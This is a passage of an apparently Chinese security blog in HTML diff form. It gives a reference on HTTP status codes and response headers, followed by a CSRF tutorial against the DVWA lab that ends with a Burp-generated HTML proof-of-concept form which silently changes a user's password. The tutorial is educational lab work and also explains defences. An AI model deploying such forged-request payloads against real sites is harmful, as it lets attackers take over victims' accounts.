+<p>405 Method Not Allowed</p>
+<p>请求行中指定的请求方法不能被用于请求相应的资源。该响应必须返回一个 Allow 头信息用以表示出当前资源能够接受的请求方法的列表。例如，需要通过 POST 呈现数据的表单上的 GET 请求，或只读资源上的 PUT 请求.</p>
+<p>鉴于 PUT,DELETE 方法会对服务器上的资源进行写操作，因而绝大部分的网页服务器都不支持或者在默认配置下不允许上述请求方法，对于此类请求均会返回 405 错误.</p>
+</li>
+<li>
+<p>406 Not Acceptable</p>
+<p>参见：内容协商</p>
+<p>请求的资源的内容特性无法满足请求头中的条件，因而无法生成响应实体，该请求不可接受.</p>
+<p>除非这是一个 HEAD 请求，否则该响应就应当返回一个包含可以让用户或者浏览器从中选择最合适的实体特性以及地址栏表的实体。实体的格式由 Content-Type 头中定义的媒体类型决定。浏览器可以根据格式及自身能力自行作出最佳选择。但是，规范中并没有定义任何作出此类自动选择的标准.</p>
+</li>
+<li>
+<p>407 Proxy Authentication Required RFC 2617</p>
+<p>与 401 响应类似，只不过客户端必须在代理服务器上进行身份验证。代理服务器必须返回一个 Proxy-Authenticate 用以进行身份询问。客户端可以返回一个 Proxy-Authorization 信息头用以验证.</p>
+</li>
+<li>
+<p>408 Request Timeout</p>
+<p>请求超时。根据 HTTP 规范，客户端没有在服务器预备等待的时间内完成一个请求的发送，客户端可以随时再次提交这一请求而无需进行任何更改.</p>
+</li>
+<li>
+<p>409 Conflict</p>
+<p>表示因为请求存在冲突无法处理该请求，例如多个同步更新之间的编辑冲突</p>
+</li>
+<li>
+<p>410 Gone</p>
+<p>表示所请求的资源不再可用。当资源被有意地删除并且资源应被清除时，应该使用这个。在收到 410 状态码后，用户应停止再次请求资源。但大多数服务端不会使用此状态码，而是直接使用 404 状态码.</p>
+</li>
+<li>
+<p>411 Length Required</p>
+<p>服务器拒绝在没有定义 Content-Length 头的情况下接受请求。在添加了表明请求消息体长度的有效 Content-Length 头之后，客户端可以再次提交该请求.[<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvSFRUUCVFNyU4QSVCNiVFNiU4MCU4MSVFNyVBMCU4MSNjaXRlX25vdGUtMzk=">39]</span></p>
+</li>
+<li>
+<p>412 Precondition Failed （RFC 7232）</p>
+<p>服务器在验证在请求的头字段中给出先决条件时，没能满足其中的一个或多个。这个状态码允许客户端在获取资源时在请求的元信息（请求头字段数据）中设置先决条件，以此避免该请求方法被应用到其希望的内容以外的资源上.</p>
+</li>
+<li>
+<p>413 Request Entity Too Large （RFC 7231）</p>
+<p>前称 “Request Entity Too Large”, 表示服务器拒绝处理当前请求，因为该请求提交的实体数据大小超过了服务器愿意或者能够处理的范围。此种情况下，服务器可以关闭连接以免客户端继续发送此请求.</p>
+<p>如果这个状况是临时的，服务器应当返回一个 Retry-After 的响应头，以告知客户端可以在多少时间以后重新尝试.</p>
+</li>
+<li>
+<p>414 Request-URI Too Long（RFC 7231）</p>
+<p>前称 “Request-URI Too Long”, 表示请求的 URI 长度超过了服务器能够解释的长度，因此服务器拒绝对该请求提供服务。通常将太多数据的结果编码为 GET 请求的查询字符串，在这种情况下，应将其转换为 POST 请求。这比较少见，通常的情况包括：本应使用 POST 方法的表单提交变成了 GET 方法，导致查询字符串过长。重定向 URI “黑洞”, 例如每次重定向把旧的 URI 作为新的 URI 的一部分，导致在若干次重定向后 URI 超长。客户端正在尝试利用某些服务器中存在的安全漏洞攻击服务器。这类服务器使用固定长度的缓冲读取或操作请求的 URI, 当 GET 后的参数超过某个数值后，可能会产生缓冲区溢出，导致任意代码被执行。没有此类漏洞的服务器，应当返回 414 状态码.</p>
+</li>
+<li>
+<p>415 Unsupported Media Type</p>
+<p>对于当前请求的方法和所请求的资源，请求中提交的互联网媒体类型并不是服务器中所支持的格式，因此请求被拒绝。例如，客户端将图像上传格式为 svg, 但服务器要求图像使用上传格式为 jpg.</p>
+</li>
+<li>
+<p>416 Requested Range Not Satisfiable（RFC 7233）</p>
+<p>前称 “Requested Range Not Satisfiable”. 客户端已经要求文件的一部分（Byte serving）, 但服务器不能提供该部分。例如，如果客户端要求文件的一部分超出文件尾端.</p>
+</li>
+<li>
+<p>417 Expectation Failed</p>
+<p>在请求头 Expect 中指定的预期内容无法被服务器满足，或者这个服务器是一个代理服显的证据证明在当前路由的下一个节点上，Expect 的内容无法被满足.</p>
+</li>
+<li>
+<p>418 I’m a teapot</p>
+<p>本操作码是在 1998 年作为 IETF 的传统愚人节笑话，在 RFC 2324 [超文本咖啡壶控制协议中定义的，并不需要在真实的 HTTP 服务器中定义。当一个控制茶壶的 HTCPCP 收到 BREW 或 POST 指令要求其煮咖啡时应当回传此错误。这个 HTTP 状态码在某些网站（<span class="exturl" data-url="aHR0cDovL3huLS1Hb29nbGUtOXk0anM0NmguY29t">包括 Google.com</span>）与项目（如 Node.js、<span class="exturl" data-url="aHR0cDovL0FTUC5ORVQ=">ASP.NET</span>]) 和 [Go 语言）中用作彩蛋</p>
+</li>
+<li>
+<p>421 Misdirected Request</p>
+<p>该请求针对的是无法产生响应的服务器（例如因为连接重用）.</p>
+</li>
+<li>
+<p>422 Unprocessable Entity</p>
+<p>请求格式正确，但是由于含有语义错误，无法响应</p>
+</li>
+<li>
+<p>423 Locked</p>
+<p>当前资源被锁定.</p>
+</li>
+<li>
+<p>424 Failed Dependency</p>
+<p>由于之前的某个请求发生的错误，导致当前请求失败，例如 PROPPATCH.</p>
+</li>
+<li>
+<p>425 Too Early</p>
+<p>服务器拒绝处理在 Early Data 中的请求，以规避可能的重放攻击</p>
+</li>
+<li>
+<p>426 Upgrade Required</p>
+<p>客户端应切换到 Upgrade 头字段中给出的不同协议，如 TLS/1.0</p>
+</li>
+<li>
+<p>428 Precondition Required</p>
+<p>原服务器要求该请求满足一定条件。这是为了防止 “未更新” 问题，即客户端读取（GET）一个资源的状态，更改它，并将它写（PUT）回服务器，但这期间第三方已经在服务器上更改了该资源的状态，因此导致了冲突.”</p>
+</li>
+<li>
+<p>429 Too Many Requests</p>
+<p>用户在给定的时间内发送了太多的请求。旨在用于网络限速</p>
+</li>
+<li>
+<p>431 Request Header Fields Too Large</p>
+<p>服务器不愿处理请求，因为一个或多个头字段过大.</p>
+</li>
+<li>
+<p>440 Login Time-out</p>
+<p>客户端 session 超时失效，需要重新登录.</p>
+</li>
+<li>
+<p>451 Unavailable For Legal Reasons</p>
+</li>
+</ul>
+<h5 id="5xx-服务器错误"><a class="markdownIt-Anchor" href="#5xx-服务器错误">#</a> 5xx 服务器错误</h5>
+<p>表示服务器无法完成明显有效的请求。这类状态码代表了服务器在处理请求的过程中有错误或者异常状态发生，也有可能是服务器意识到以当前的软硬件资源无法完成对请求的处理。除非这是一个 HEAD 请求，否则服务器应当包含一个解释当前错误状态以及这个状况是临时的还是永久的解释信息实体。浏览器应当向用户展示任何在当前响应中被包含的实体。这些状态码适用于任何响应方法.</p>
+<ul>
+<li>
+<p>500 Internal Server Error</p>
+<p>通用错误消息，服务器遇到了一个未曾预料的状况，导致了它无法完成对请求的处理。没有给出具体错误信息.</p>
+</li>
+<li>
+<p>501 Not Implemented</p>
+<p>服务器不支持当前请求所需要的某个功能。当服务器无法识别请求的方法，并且无法支持其对任何资源的请求.（例如，网络服务 API 的新功能）</p>
+</li>
+<li>
+<p>502 Bad Gateway</p>
+<p>作为网关或者代理工作的服务器尝试执行请求时，从上游服务器接收到无效的响应.</p>
+</li>
+<li>
+<p>503 Service Unavailable</p>
+<p>由于临时的服务器维护或者过载，服务器当前无法处理请求。这个状况是暂时的，并且将在一段时间以后恢复。如果能够预计延迟时间，那么响应中可以包含一个 Retry-After 头用以标明这个延迟时间。如果没有给出这个 Retry-After 信息，那么客户端应当以处理 500 响应的方式处理它.</p>
+</li>
+<li>
+<p>504 Gateway Timeout</p>
+<p>作为网关或者代理工作的服务器尝试执行请求时，未能及时从上游服务器（URI 标识出的服务器，例如 HTTP、FTP、LDAP）或者辅助服务器（例如 DNS）收到响应.</p>
+<p>注意：某些代理服务器在 DNS 查询超时时会返回 400 或者 500 错误.</p>
+</li>
+<li>
+<p>505 HTTP Version Not Supported</p>
+<p>服务器不支持，或者拒绝支持在请求中使用的 HTTP 版本。这暗示着服务器不能或不愿使用与客户端相同的版本。响应中应当包含一个描述了为何版本不被支持以及服务器支持哪些协议的实体.</p>
+</li>
+<li>
+<p>506 Variant Also Negotiates</p>
+<p>由《透明内容协商协议》扩展，代表服务器存在内部配置错误，[<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvSFRUUCVFNyU4QSVCNiVFNiU4MCU4MSVFNyVBMCU4MSNjaXRlX25vdGUtUkZDXzIyOTUtNjQ=">64]</span> 被请求的协商变元资源被配置为在透明内容协商中使用自己，因此在一个协商处理中不是一个合适的重点.</p>
+</li>
+<li>
+<p>507 Insufficient Storage</p>
+<p>服务器无法存储完成请求所必须的内容。这个状况被认为是临时的.</p>
+</li>
+<li>
+<p>508 Loop Detected</p>
+<p>服务器在处理请求时陷入死循环. （可代替 208 状态码]）</p>
+</li>
+<li>
+<p>510 Not Extended</p>
+<p>获取资源所需要的策略并没有被满足</p>
+</li>
+<li>
+<p>511 Network Authentication Required ）</p>
+<p>客户端需要进行身份验证才能获得网络访问权限，旨在限制用户群访问特定网络.（例如连接 WiFi 热点时的强制网络门户）</p>
+</li>
+</ul>
+<h3 id="响应标记头"><a class="markdownIt-Anchor" href="#响应标记头">#</a> 响应标记头</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">字段名</th>
+<th style="text-align:center">说明</th>
+<th style="text-align:center">例子</th>
+<th style="text-align:center">状态</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">Access-Control-Allow-Origin</td>
+<td style="text-align:center">指定哪些网站可参与到跨来源资源共享过程中</td>
+<td style="text-align:center"><code>Access-Control-Allow-Origin: *</code></td>
+<td style="text-align:center">临时</td>
+</tr>
+<tr>
+<td style="text-align:center">Accept-Patch</td>
+<td style="text-align:center">指定服务器支持的文件格式类型.</td>
+<td style="text-align:center"><code>Accept-Patch: text/example;charset=utf-8</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Accept-Ranges</td>
+<td style="text-align:center">这个服务器支持哪些种类的部分内容范围</td>
+<td style="text-align:center"><code>Accept-Ranges: bytes</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Age</td>
+<td style="text-align:center">这个对象在代理缓存中存在的时间，以秒为单位</td>
+<td style="text-align:center"><code>Age: 12</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Allow</td>
+<td style="text-align:center">对于特定资源有效的动作。针对 HTTP/405 这一错误代码而使用</td>
+<td style="text-align:center"><code>Allow: GET, HEAD</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Cache-Control</td>
+<td style="text-align:center">向从服务器直到客户端在内的所有缓存机制告知，它们是否可以缓存这个对象。其单位为秒</td>
+<td style="text-align:center"><code>Cache-Control: max-age=3600</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Connection</td>
+<td style="text-align:center">针对该连接所预期的选项</td>
+<td style="text-align:center"><code>Connection: close</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Content-Disposition</td>
+<td style="text-align:center">一个可以让客户端下载文件并建议文件名的头部。文件名需要用双引号包裹.</td>
+<td style="text-align:center"><code>Content-Disposition: attachment; filename=&quot;fname.ext&quot;</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Content-Encoding</td>
+<td style="text-align:center">在数据上使用的编码类型。参考 超文本传输协议压缩 .</td>
+<td style="text-align:center"><code>Content-Encoding: gzip</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Content-Language</td>
+<td style="text-align:center">内容所使用的语言</td>
+<td style="text-align:center"><code>Content-Language: da</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Content-Length</td>
+<td style="text-align:center">回应消息体的长度，以 字节 （8 位为一字节）为单位</td>
+<td style="text-align:center"><code>Content-Length: 348</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Content-Location</td>
+<td style="text-align:center">所返回的数据的一个候选位置</td>
+<td style="text-align:center"><code>Content-Location: /index.htm</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Content-MD5</td>
+<td style="text-align:center">回应内容的二进制 MD5 散列，以 Base64 方式编码</td>
+<td style="text-align:center"><code>Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==</code></td>
+<td style="text-align:center">过时的</td>
+</tr>
+<tr>
+<td style="text-align:center">Content-Range</td>
+<td style="text-align:center">这条部分消息是属于某条完整消息的哪个部分</td>
+<td style="text-align:center"><code>Content-Range: bytes 21010-47021/47022</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Content-Type</td>
+<td style="text-align:center">当前内容的 MIME 类型</td>
+<td style="text-align:center"><code>Content-Type: text/html; charset=utf-8</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Date</td>
+<td style="text-align:center">此条消息被发送时的日期和时间 (按照 RFC 7231 中定义的 “超文本传输协议日期” 格式来表示)</td>
+<td style="text-align:center"><code>Date: Tue, 15 Nov 1994 08:12:31 GMT</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center"><span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvSFRUUF9FVGFn">ETag</span></td>
+<td style="text-align:center">对于某个资源的某个特定版本的一个标识符，通常是一个 消息散列</td>
+<td style="text-align:center"><code>ETag: &quot;737060cd8c284d8af7ad3082f209582d&quot;</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Expires</td>
+<td style="text-align:center">指定一个日期 / 时间，超过该时间则认为此回应已经过期</td>
+<td style="text-align:center"><code>Expires: Thu, 01 Dec 1994 16:00:00 GMT</code></td>
+<td style="text-align:center">常设：标准</td>
+</tr>
+<tr>
+<td style="text-align:center">Last-Modified</td>
+<td style="text-align:center">所请求的对象的最后修改日期 (按照 RFC 7231 中定义的 “超文本传输协议日期” 格式来表示)</td>
+<td style="text-align:center"><code>Last-Modified: Tue, 15 Nov 1994 12:45:26 GMT</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Link</td>
+<td style="text-align:center">用来表达与另一个资源之间的类型关系，此处所说的类型关系是在 RFC 5988 中定义的</td>
+<td style="text-align:center"><code>Link: &lt;/feed&gt;; rel=&quot;alternate&quot;</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Location</td>
+<td style="text-align:center">用来 进行重定向，或者在创建了某个新资源时使用.</td>
+<td style="text-align:center"><code>Location: http://www.w3.org/pub/WWW/People.html</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">P3P</td>
+<td style="text-align:center">用于支持设置 P3P 策略，标准格式为 “ <code>P3P:CP=&quot;your_compact_policy&quot;</code> ”. 然而 P3P 规范并不成功，[<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvSFRUUCVFNSVBNCVCNCVFNSVBRCU5NyVFNiVBRSVCNSNjaXRlX25vdGUtMzM=">33]</span> 大部分现代浏览器没有完整实现该功能，而大量网站也将该值设为假值，从而足以用来欺骗浏览器的 P3P 插件功能并授权给第三方 Cookies.</td>
+<td style="text-align:center"><code>P3P: CP=&quot;This is not a P3P policy! ``See http://www.google.com/support/accounts/bin/answer.py?hl=en&amp;answer=151657 for more info.&quot;</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Pragma</td>
+<td style="text-align:center">与具体的实现相关，这些字段可能在请求 / 回应链中的任何时候产生多种效果.</td>
+<td style="text-align:center"><code>Pragma: no-cache</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Proxy-Authenticate</td>
+<td style="text-align:center">要求在访问代理时提供身份认证信息.</td>
+<td style="text-align:center"><code>Proxy-Authenticate: Basic</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Public-Key-Pins</td>
+<td style="text-align:center">用于缓解中间人攻击，声明网站认证使用的传输层安全协议证书的散列值</td>
+<td style="text-align:center"><code>Public-Key-Pins: max-age=2592000; pin-sha256=&quot;E9CZ9INDbd+2eRQozYqqbQ2yXLVKB9+xcprMF+44U1g=&quot;;</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Refresh</td>
+<td style="text-align:center">用于设定可定时的重定向跳转。右边例子设定了 5 秒后跳转至 “ <code>http://www.w3.org/pub/WWW/People.html</code> ”.</td>
+<td style="text-align:center"><code>Refresh: 5; url=http://www.w3.org/pub/WWW/People.html</code></td>
+<td style="text-align:center">专利并非标准 Netscape 实现的扩展，但大部分网页浏览器也支持.</td>
+</tr>
+<tr>
+<td style="text-align:center">Retry-After</td>
+<td style="text-align:center">如果某个实体临时不可用，则，此协议头用来告知客户端日后重试。其值可以是一个特定的时间段 (以秒为单位) 或一个超文本传输协议日期.</td>
+<td style="text-align:center">Example 1:  <code>Retry-After: 120</code> Example 2:  <code>Retry-After: Fri, 07 Nov 2014 23:59:59 GMT</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Server</td>
+<td style="text-align:center">服务器的名字</td>
+<td style="text-align:center"><code>Server: Apache/2.4.1 (Unix)</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Set-Cookie</td>
+<td style="text-align:center">HTTP cookie</td>
+<td style="text-align:center"><code>Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1</code></td>
+<td style="text-align:center">常设：标准</td>
+</tr>
+<tr>
+<td style="text-align:center">Status</td>
+<td style="text-align:center">通用网关接口 协议头字段，用来说明当前这个超文本传输协议回应的 状态。普通的超文本传输协议回应，会使用单独的 “状态行”（“Status-Line”）作为替代，这一点是在 RFC 7230 中定义的.</td>
+<td style="text-align:center"><code>Status: 200 OK</code></td>
+<td style="text-align:center">Not listed as a registered field name</td>
+</tr>
+<tr>
+<td style="text-align:center">Strict-Transport-Security</td>
+<td style="text-align:center">HTTP 严格传输安全这一头部告知客户端缓存这一强制 HTTPS 策略的时间，以及这一策略是否适用于其子域名.</td>
+<td style="text-align:center"><code>Strict-Transport-Security: max-age=16070400; includeSubDomains</code></td>
+<td style="text-align:center">常设：标准</td>
+</tr>
+<tr>
+<td style="text-align:center">Trailer</td>
+<td style="text-align:center">这个头部数值指示了在这一系列头部信息由由分块传输编码编码.</td>
+<td style="text-align:center"><code>Trailer: Max-Forwards</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Transfer-Encoding</td>
+<td style="text-align:center">用来将实体安全地传输给用户的编码形式。当前定义的方法包括：分块（chunked）、compress、deflate、gzip 和 identity.</td>
+<td style="text-align:center"><code>Transfer-Encoding: chunked</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Upgrade</td>
+<td style="text-align:center">要求客户端升级到另一个协议.</td>
+<td style="text-align:center"><code>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Vary</td>
+<td style="text-align:center">告知下游的代理服务器，应当如何对未来的请求协议头进行匹配，以决定是否可使用已缓存的回应内容而不是重新从原始服务器请求新的内容.</td>
+<td style="text-align:center"><code>Vary: *</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Via</td>
+<td style="text-align:center">告知代理服务器的客户端，当前回应是通过什么途径发送的.</td>
+<td style="text-align:center"><code>Via: 1.0 fred, 1.1 example.com (Apache/1.1)</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">Warning</td>
+<td style="text-align:center">一般性的警告，告知在实体内容体中可能存在错误.</td>
+<td style="text-align:center"><code>Warning: 199 Miscellaneous warning</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">WWW-Authenticate</td>
+<td style="text-align:center">表明在请求获取这个实体时应当使用的认证模式.</td>
+<td style="text-align:center"><code>WWW-Authenticate: Basic</code></td>
+<td style="text-align:center">常设</td>
+</tr>
+<tr>
+<td style="text-align:center">X-Frame-Options</td>
+<td style="text-align:center">点击劫持保护： <code>deny</code> ：该页面不允许在 frame 中展示，即使是同域名内. <code>sameorigin</code> ：该页面允许同域名内在 frame 中展示. <code>allow-from *uri*</code> ：该页面允许在指定 uri 的 frame 中展示. <code>allowall</code> ：允许任意位置的 frame 显示，非标准值.</td>
+<td style="text-align:center"><code>X-Frame-Op</code></td>
+<td style="text-align:center"></td>
+</tr>
+</tbody>
+</table>
+<h2 id="csrf漏洞"><a class="markdownIt-Anchor" href="#csrf漏洞">#</a> CSRF 漏洞</h2>
+<h3 id="漏洞信息"><a class="markdownIt-Anchor" href="#漏洞信息">#</a> 漏洞信息</h3>
+<blockquote>
+<p>CSRF: 全称  <code>Cross-site request forgery</code> , 翻译过来就是跨站请求伪造 (客户端), 是指利用受害者尚未失效的身份认证信息 ( <code>cookie</code>  、会话等), 诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向 (身份认证信息所对应的) 服务器发送请求，从而完成非法操作。比如 A 网站的 a 用户，修改密码的操作是靠 <code>http://xxx.com/xx.php?password=jiangjiyue</code>  向服务器发送一个 get 请求来执行的，那么如果在防御机制较差的情况下，攻击者 b 在恶意网站 B 的某个页面插入 <code>&lt;img scr='http://xxx.com/xx.php?password=jiangjiyue' /&gt;</code> , 并诱使 a 访问，那么 a 在访问恶意页面时实际就以自己的身份向服务器发送了一次修改密码请求，而服务器做出响应后，a 用户密码将被改成 <code>jiangjiyue</code></p>
+</blockquote>
+<h3 id="漏洞利用条件"><a class="markdownIt-Anchor" href="#漏洞利用条件">#</a> 漏洞利用条件</h3>
+<p>CSRF 漏洞有两个关键条件，理解这两个条件可以帮助我们理解并防御 CSRF 漏洞:</p>
+<ol>
+<li>
+<p>服务端验证 refer</p>
+<p>简单来说就是判断用户从哪个页面来，如果发现 A 用户的修改密码请求是来自 B 网站的，就应该拒绝执行。机制不完善，导致另一个不可信站点的请求可以被服务器接收并返回相应数据.</p>
+</li>
+<li>
+<p>服务端验证 token</p>
+<p>服务端应该在每次用户执行敏感操作时 (如更改密码), 从服务端返回一个随机 (术语称 token) 数给用户，用户请求时必须带上和服务端一致的 token, 否则拒绝执行。若没有采取 token 机制或 token 可预测，那么 CSRF 就变得容易利用</p>
+</li>
+</ol>
+<h3 id="csrf利用流程"><a class="markdownIt-Anchor" href="#csrf利用流程">#</a> CSRF 利用流程</h3>
+<ol>
+<li>攻击者发现 CSRF 漏洞</li>
+<li>构造代码</li>
+<li>发送给受害人</li>
+<li>受害人打开</li>
+<li>受害人执行代码</li>
+<li>完成攻击</li>
+</ol>
+<h3 id="漏洞实验"><a class="markdownIt-Anchor" href="#漏洞实验">#</a> 漏洞实验</h3>
+<p><strong>本次靶场采用的为 dvwa</strong></p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>IP</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>靶机</td>
+<td><code>192.168.86.131</code></td>
+</tr>
+<tr>
+<td>本机 (也就是构造 POC 的服务器)</td>
+<td><span class="exturl" data-url="aHR0cDovL3d3dy52bWNlbnRvcy5jb20=">www.vmcentos.com</span></td>
+</tr>
+</tbody>
+</table>
+<h4 id="低级"><a class="markdownIt-Anchor" href="#低级">#</a> 低级</h4>
+<h5 id="请求分析"><a class="markdownIt-Anchor" href="#请求分析">#</a> 请求分析</h5>
+<p>首先我们进入 DVWA 目标网站，用户名 admin, 密码 password, 并将级别配置为 low. 来到 CSRF 选项，执行一次正常的修改密码并进行观察。可以看到，更改密码的请求是直接放到 url 里的 get 请求.</p>
+<p><img data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827091622243.png" alt="image-20220827091622243"></p>
+<p><strong>可以看到以上请求包内也没有 token 第一个要求满足</strong></p>
+<p>然后我们看看第二个要求 refer</p>
+<p>我们右键 <code>Send to Repeater</code>  或者快捷键 <code>Ctrl+R</code>  发送到 repeater 模块</p>
+<p><img data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827092420828.png" alt="image-20220827092420828"></p>
+<p><img data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827092659256.png" alt="image-20220827092659256"></p>
+<p><strong>通过以上图片我们可以分析出即使将 <code>referer</code>  删掉之后也可以造成密码更改，2 个条件都满足</strong></p>
+<h5 id="构建poc"><a class="markdownIt-Anchor" href="#构建poc">#</a> 构建 POC</h5>
+<p><img data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827093043237.png" alt="image-20220827093043237"></p>
+<p>我们复制以下内容在本机的 <code>phpstudy</code>  中构造恶意页面</p>
+<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --></span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://192.168.86.131:8042/vulnerabilities/csrf/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="6"></td><td><pre>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token entity" title="&#95;">&amp;#95;</span>new<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>qqqq<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></pre></td></tr><tr><td data-num="7"></td><td><pre>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token entity" title="&#95;">&amp;#95;</span>conf<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>qqqq<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></pre></td></tr><tr><td data-num="8"></td><td><pre>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Change<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Change<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></pre></td></tr><tr><td data-num="9"></td><td><pre>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit request<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><p><img data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827093401048.png" alt="image-20220827093401048"></p>
